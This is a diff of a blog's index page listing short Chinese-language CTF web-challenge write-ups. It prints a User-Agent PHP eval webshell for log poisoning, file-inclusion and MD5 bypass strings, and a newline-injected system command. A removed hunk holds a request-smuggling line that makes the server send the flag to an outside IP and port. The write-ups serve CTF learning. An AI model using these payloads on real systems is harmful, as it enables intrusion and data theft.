@@ -110,6 +110,48 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Dest0g3 520迎新赛</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web phpdest 日志包含 &lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) { require_once($_GET[&#39;file&#39;]); } 倒是很久没有写日志包含了
+?file=/var/log/nginx/access.logUser-Agent : &lt;?php eval($_POST[1]);?&gt; 蚁剑拿flag
+又看到个姿势require_once的多次软连接绕过
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHP 数组异常使用 &lt;?php highlight_file(__FILE__); include &#34;fl4g.php&#34;; $dest0g3 = $_POST[&#39;ctf&#39;]; $time = date(&#34;H&#34;); $timme = date(&#34;d&#34;); $timmme = date(&#34;i&#34;); if(($time &gt; &#34;24&#34;) or ($timme &gt; &#34;31&#34;) or ($timmme &gt; &#34;60&#34;)){ echo $fl4g; }else{ echo &#34;Try harder!&#34;; } set_error_handler( function() use(&amp;$fl4g) { print $fl4g; } ); $fl4g .= $dest0g3; ?&gt; set_error_handler () 函数设置用户定义的错误处理函数。.</div><div class="post-footer">
+        <a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/hitconctf/">hitconCTF</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">RCE nodejs，express组件
+主要源码
+const express = require(&#39;express&#39;); const cookieParser = require(&#39;cookie-parser&#39;) const crypto = require(&#39;crypto&#39;); const { ChildProcess } = require(&#39;child_process&#39;); const { access } = require(&#39;fs/promises&#39;); const randomHex = () =&gt; &#39;0123456789abcdef&#39;[~~(Math.random() * 16)]; const app = express(); app.use(cookieParser(crypto.randomBytes(20).toString(&#39;hex&#39;))); // 随机20个字节 app.get(&#39;/&#39;, function (_, res) { res.cookie(&#39;code&#39;, &#39;&#39;, { signed: true }) .sendFile(__dirname + &#39;/index.html&#39;); }); app.get(&#39;/random&#39;, function (req, res) { let result = null; if (req.signedCookies.code.length &gt;= 40) { const code = Buffer.</div><div class="post-footer">
+        <a href="/posts/ctf/hitconctf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/hxp2022/">hxp2022</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">valentine nodejs的ssti，可以任意修改前台的模板
+app.js
+var express = require(&#39;express&#39;); var bodyParser = require(&#39;body-parser&#39;) const crypto = require(&#34;crypto&#34;); var path = require(&#39;path&#39;); const fs = require(&#39;fs&#39;); var app = express(); viewsFolder = path.join(__dirname, &#39;views&#39;); if (!fs.existsSync(viewsFolder)) { fs.mkdirSync(viewsFolder); } app.set(&#39;views&#39;, viewsFolder); app.set(&#39;view engine&#39;, &#39;ejs&#39;); app.use(bodyParser.urlencoded({ extended: false })) app.post(&#39;/template&#39;, function(req, res) { let tmpl = req.body.tmpl; let i = -1; while((i = tmpl.indexOf(&#34;&lt;%&#34;, i+1)) &gt;= 0) { if (tmpl.substring(i, i+11) !== &#34;&lt;%= name %&gt;&#34;) { res.</div><div class="post-footer">
+        <a href="/posts/ctf/hxp2022/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/newstarctf-web/">NewStarCTF-web</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week1 HTTP cookie 修改admin 源码发现key GET和POST传参即可
+Head?Header! User-Agent: CTFReferer: ctf.comX-Forwarded-For: 127.0.0.1 我真的会谢 信息泄露
+robots.txt
+www.zip
+源码 + /.index.php.swp
+NotPHP 函数绕过 if(file_get_contents($_GET[&#39;data&#39;]) == &#34;Welcome to CTF&#34;){ if(md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]){ if(!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) == 2077){ echo &#34;Hack Me&#34;; eval(&#34;#&#34;.$_GET[&#39;cmd&#39;]); }else{ die(&#34;Number error!&#34;); } }else{ die(&#34;Wrong Key!&#34;); } }else{ die(&#34;Pass it!&#34;); 1,绕过file_get_contents()，用input伪协议，即 /?data=php://input POST一个Welcome to CTF
+用data协议绕，?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=
+2,md5强比较碰撞&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 这里可以直接数组绕过 key1[]=1&amp;key2[]=2
+3，绕数字判断，intval只取前面的数字，后面的字母会忽略
+num=2077abc
+4，绕# 命令执行，用回车符%0d，我用换行符%0a打不通不知道为啥
+&amp;cmd=%0dsystem(&quot;ls /&quot;); 在bp里需要URL编码进去rec</div><div class="post-footer">
+        <a href="/posts/ctf/newstarctf-web/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/nodejs/">nodejs</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。
@@ -142,63 +184,6 @@ require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Fil
 &lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.</div><div class="post-footer">
         <a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Python pth文件写入getshell</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a>&nbsp;<a href="/categories/%E6%9D%82%E6%96%87%E8%AE%B0%E5%BD%95/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>杂文记录</a></span></div><div class="content">原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
-python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
-sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
-D:/Python/temp/ 重新启动python
-1.path的路径被添加到sys.path中
-site.py的实现中，有这么一段
-def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.</div><div class="post-footer">
-        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">python总结</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">任意文件读取(目录穿越) 2022网鼎杯-web669 例题 直接读取文件、参数可控且过滤不全
-#以下为部分关键代码，其它部分已省略 #............. @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) #............. 由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（&hellip;.//）即可进行绕过
-path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) 然后接下来使用flask的send_file模块读取文件
-if os.path.isfile(path): return send_file(path) 实现了任意文件读取
-使用open打开文件但未close 配合任意文件读取/proc/self/fd
-2020网鼎杯白虎组Web-PicDown app.py源码如下
-from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &#34;/tmp/secret.</div><div class="post-footer">
-        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/sctf2023/">SCTF2023</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB ezcheck1n 这里一直提示time，year不是2023 ，是2022 ，因为下面的post.jpeg
-Apache 版本2.4.54 最近有个请求走私的洞，nssctf 13也出了这个点
-https://xz.aliyun.com/t/12345根据这文章里的脚本修改一下，去拿2022.php外带出$FLAG,
-确实应该这样想/2023/目录是不能变的他题目里的注释里也写了中间件只能转发2023
-/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0aGET%20/2022.php%3Furl%3D47%2E100%2E196%2E3%3A4444 fumo_backdoor 源码
-&lt;?php error_reporting(0); ini_set(&#39;open_basedir&#39;, __DIR__.&#34;:/tmp&#34;); define(&#34;FUNC_LIST&#34;, get_defined_functions()); class fumo_backdoor { public $path = null; public $argv = null; public $func = null; public $class = null; public function __sleep() { if ( file_exists($this-&gt;path) &amp;&amp; preg_match_all(&#39;/[flag]/m&#39;, $this-&gt;path) === 0 ) { readfile($this-&gt;path); } } public function __wakeup() { $func = $this-&gt;func; if ( is_string($func) &amp;&amp; in_array($func, FUNC_LIST[&#34;internal&#34;]) ) { call_user_func($func); } else { $argv = $this-&gt;argv; $class = $this-&gt;class; new $class($argv); } } } $cmd = $_REQUEST[&#39;cmd&#39;]; $data = $_REQUEST[&#39;data&#39;]; switch ($cmd) { case &#39;unserialze&#39;: unserialize($data); break; case &#39;rm&#39;: system(&#34;rm -rf /tmp 2&gt;/dev/null&#34;); break; default: highlight_file(__FILE__); break; } Sycsever 直接运行给的mian文件</div><div class="post-footer">
-        <a href="/posts/ctf/sctf2023/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/vnctf2023/">VNCTF2023</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web 象棋王子 经典js小游戏
-人性化的签到直接就是jsfuck
-电子木鱼 是一个rust的逻辑利用
-/路由，查看功德数，得这么多才输出flag
-/reset 路由 ，重启
-/upgrade 是个post路由
-可以post传入 上面定义的Payload
-post可以定义这两个参数
-重要的逻辑在这里
-首先name必须是&quot;Donate&quot;或&quot;Cost&quot;
-这两个name的cost分别对应1和10,为正数，所以 GONGDE.set(GONGDE.get() - cost as i32);只会更小
-那么利用cost *= body.quantity; 来使得cost为负数，需要quantity为负数
-由于cost是int32类型变量，这里可以试着溢出，cost是i32，最大值是2147483647，超过这部分会给截断。
-name: Cost的默认cost值是10
-事实上只要 cost * quantity &gt;= int32_max值 即可达到溢出
-传name=Cost&amp;quantity=2047483647，得到flag
-misc 验证码 </div><div class="post-footer">
-        <a href="/posts/ctf/vnctf2023/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -218,6 +203,14 @@ misc 验证码 </div><div class="post-footer">
                 </li><li class="page-item ">
                     <span class="page-link">
                         <a href="/page/5/">5</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/6/">6</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/7/">7</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
